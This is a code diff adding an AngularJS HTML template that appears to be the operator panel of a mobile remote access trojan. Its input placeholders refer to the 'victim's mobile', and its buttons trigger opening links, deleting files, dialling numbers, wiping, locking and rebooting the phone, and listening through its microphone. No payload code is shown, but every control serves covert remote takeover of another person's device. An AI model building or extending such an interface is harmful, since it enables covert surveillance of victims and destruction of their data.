@@ -1,0 +1,44 @@
+<div class="ui {{load}} segment h100" style="overflow: scroll; height: 400px;" id="parent">
+    <table class="ui fixed table" style="border: none">
+        <tbody infinite-scroll="increaseLimit()" infinite-scroll-container='"#parent"'>
+
+            <tr ng-repeat="app in utils | limitTo:barLimit">
+
+                <div class="ui fluid action input">
+                    <input type="text" ng-model="utils.url" placeholder="Paste url to open on victim's mobile.">
+                    <button ng-click="OpenURL(utils.url)" class="ui black button">Open Link</button>
+                </div>
+            </tr>
+
+            <br>
+            
+            <tr ng-repeat="limitTo:barLimit">
+                <div class="ui fluid action input">
+                    <input type="text" ng-model="utils.fileFolderPath" placeholder="Specify file path to delete.">
+                    <button ng-click="DeleteFileFolder(utils.fileFolderPath)" class="ui black button">Delete</button>
+                </div>
+            </tr>
+
+            <br>
+
+            <tr ng-repeat="limitTo:barLimit">
+                <div class="ui fluid action input">
+                    <input type="number" ng-model="utils.number" placeholder="Type a number to dial.">
+                    <button ng-click="DialNumber(utils.number)" class="ui black button">Dial Now</button>
+                </div>
+            </tr>
+
+            <br>
+
+            <tr ng-repeat="limitTo:barLimit">
+                <div class="ui fluid action">
+                    <button ng-click="WipeDevice()" class="ui black button">Wipe Device</button>
+                    <button ng-click="LockDevice()" class="ui black button">Lock Device</button>
+                    <button ng-click="RebootDevice()" class="ui black button">Reboot Device</button>
+                    <button ng-click="ListenMic()" class="ui black button">Listen Microphone</button>
+                </div>
+            </tr>
+            
+        </tbody>
+    </table>
+</div>
